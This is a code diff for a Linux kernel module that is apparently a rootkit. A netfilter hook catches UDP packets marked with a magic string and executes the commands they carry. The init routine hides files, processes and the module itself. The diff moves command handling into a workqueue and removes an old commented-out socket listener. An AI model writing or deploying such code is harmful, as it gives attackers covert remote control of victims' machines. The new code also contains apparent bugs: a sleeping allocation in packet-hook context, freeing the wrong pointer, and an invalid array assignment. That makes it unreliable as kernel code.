@@ -16,6 +16,7 @@
 #include <linux/ip.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
+#include <linux/workqueue.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yanay Goor");
@@ -533,12 +534,40 @@ static int send_response(
     return dev_queue_xmit(skb);
 }
 
+static struct workqueue_struct *command_handler_queue;
+
+struct MRK_command_work {
+    struct work_struct work;
+    struct cmd_type *cmd;
+    const char *data;
+    int data_len;
+    unsigned int daddr;
+    unsigned int saddr;
+    unsigned int source;
+    char h_source[ETH_ALEN];
+    struct net_device *dev;
+};
+
+static void handle_command(struct work_struct *work) {
+    int result;
+    struct MRK_command_work *command_work = (struct MRK_command_work *)work;
+    result = call_cmd(command_work->cmd, command_work->data + job_id_len + strlen(cmd_magic), command_work->data_len);
+    printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", command_work->cmd->name, result);
+    send_response(get_unaligned((unsigned short *)(command_work->data + strlen(cmd_magic))), result, command_work->daddr, command_work->saddr, command_work->source, command_work->h_source, command_work->dev);
+    // From https://github.com/torvalds/linux/blob/v5.8/kernel/workqueue.c:2173
+    // It is permissible to free the struct work_struct from inside the function that is called from it.
+    kfree(work->data);
+    kfree(work);
+}
+
 static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
     struct iphdr *iph;
     struct udphdr *udph;
     const char *user_data;
+    char *user_data_copy;
     int i;
-    int result;
+    int user_data_len;
+    struct MRK_command_work *command_work;
 
     iph = ip_hdr(skb);
     if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;
@@ -546,18 +575,30 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     udph = udp_hdr(skb);
     if (ntohs(udph->dest) != cmd_port) return NF_ACCEPT;
 
+    user_data_len = ntohs(udph->len) - sizeof(struct udphdr);
+
     #ifdef NET_SKBUFF_DATA_USES_OFFSET
-    user_data = skb->head + skb->tail - ntohs(udph->len) + sizeof(struct udphdr);
+    user_data = skb->head + skb->tail - user_data_len;
     #else
-    user_data = skb->tail - ntohs(udph->len) + sizeof(struct udphdr);
+    user_data = skb->tail - user_data_len;
     #endif
 
     if (strncmp(user_data, cmd_magic, strlen(cmd_magic))) return NF_ACCEPT;
     for (i = 0; i < cmds_len; i++) {
         if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
-            result = call_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
-            printk(KERN_INFO "Found %s cmd packet! executed with code %d\n", cmds[i].name, result);
-            send_response(get_unaligned((unsigned short *)(user_data + strlen(cmd_magic))), result, iph->daddr, iph->saddr, udph->source, eth_hdr(skb)->h_source, skb->dev);
+              command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
+              INIT_WORK((struct work_struct *)command_work, handle_command);
+              command_work->cmd = cmds + i;
+              user_data_copy = kmalloc(user_data_len, GFP_KERNEL);
+              memcpy(user_data_copy, user_data, user_data_len);
+              command_work->data = user_data_copy;
+              command_work->data_len = user_data_len;
+              command_work->daddr = iph->daddr;
+              command_work->saddr = iph->saddr;
+              command_work->source = udph->source;
+              command_work->h_source = eth_hdr(skb)->h_source;
+              command_work->dev = skb->dev;
+              queue_work(command_handler_queue, (struct work_struct *)command_work);
             return NF_DROP;
         }
     }
@@ -568,6 +609,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
 struct nf_hook_ops *net_hook;
 
 static int MRK_init_nethook(void) {
+    command_handler_queue = create_workqueue("command_handler");
     net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
     net_hook->hook = MRK_hookfn;
     net_hook->hooknum = NF_INET_PRE_ROUTING;
@@ -576,41 +618,8 @@ static int MRK_init_nethook(void) {
     return nf_register_net_hook(&init_net, net_hook);
 }
 
-//static int MRK_thread_fn(void *data) {
-//    int retval;
-//    int length;
-//    struct kvec iov;
-//    struct msghdr cmd_msg;
-//    void *buffer;
-//    struct sockaddr_in addr = {
-//	    AF_INET,
-//	    htons(1111),
-//	    {INADDR_ANY}
-//	};
-//    printk(KERN_INFO "started kthread");
-//    buffer = kmalloc(2048, GFP_KERNEL);
-//    if ((retval = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &cmd_socket))) {
-//	    return retval;
-//	}
-//    printk(KERN_INFO "created socket in kthread");
-//	iov.iov_base = buffer;
-//	iov.iov_len = 2048;
-////	int kernel_recvmsg(struct socket *sock, struct msghdr *msg, struct kvec *vec, size_t num, size_t size, int flags);
-//	if ((retval = kernel_bind(cmd_socket, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)))) {
-//        printk(KERN_INFO "binding failed with status %d", retval);
-//	    return retval;
-//	}
-//    printk(KERN_INFO "bounded socket");
-//	while(1) {
-//	    length = kernel_recvmsg(cmd_socket, &cmd_msg, &iov, 1, 2048, 0);
-//	    printk(KERN_INFO "recived msg with len %d", length);
-//	}
-//
-//}
-
 
 static int __init MRK_initialize(void) {
-//    struct task_struct *MRK_kthread;
     MRK_init_nethook();
     init_hidden_processes();
 	hide_file(test_path_name);
@@ -619,8 +628,6 @@ static int __init MRK_initialize(void) {
     hide_process("/bin/ps");
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
-//	MRK_kthread = kthread_create(MRK_thread_fn, 0, "MRK thread");
-//	wake_up_process(MRK_kthread);
 	return 0;
 }
 
